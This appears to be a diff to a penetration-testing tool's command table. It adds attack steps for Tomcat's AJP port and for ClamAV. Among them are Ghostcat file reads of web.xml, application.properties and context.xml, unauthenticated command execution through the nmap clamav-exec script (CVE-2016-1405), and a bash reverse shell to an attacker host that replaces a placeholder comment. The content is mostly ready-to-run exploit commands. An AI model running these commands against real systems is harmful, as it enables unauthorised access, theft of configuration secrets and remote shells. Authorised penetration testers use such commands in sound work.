@@ -4621,9 +4621,12 @@ _STEP_COMMANDS = {
     "ajp": {
         1: [
             "nmap -sV -p8009 <RHOST>",
+            "nmap -p8009 --script ajp-headers,ajp-methods <RHOST>",
         ],
         2: [
             "python3 ajpShooter.py http://<RHOST>:8080 8009 /WEB-INF/web.xml read",
+            "python3 ajpShooter.py http://<RHOST>:8080 8009 /WEB-INF/classes/application.properties read",
+            "python3 ajpShooter.py http://<RHOST>:8080 8009 /META-INF/context.xml read",
             "msfconsole -q -x 'use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS <RHOST>; run'",
         ],
         3: [
@@ -4636,13 +4639,17 @@ _STEP_COMMANDS = {
     "clamav": {
         1: [
             "nc -nv <RHOST> 3310   # then send: PING / VERSION",
+            "echo PING | nc -q1 <RHOST> 3310      # expect: PONG",
+            "echo VERSION | nc -q1 <RHOST> 3310",
+            "nmap -p3310 --script clamav-exec <RHOST>",
         ],
         2: [
+            "nmap -p3310 --script clamav-exec --script-args cmd='id' <RHOST>   # CVE-2016-1405 unauth cmd exec",
             "searchsploit clamav",
             "msfconsole -q -x 'search clamav'",
         ],
         3: [
-            "# use the RCE to stage a reverse shell as the clamav user",
+            "nmap -p3310 --script clamav-exec --script-args cmd='bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"' <RHOST>",
         ],
         4: [
             "# HackTricks ClamAV: https://book.hacktricks.xyz/network-services-pentesting/3310-pentesting-clamav",
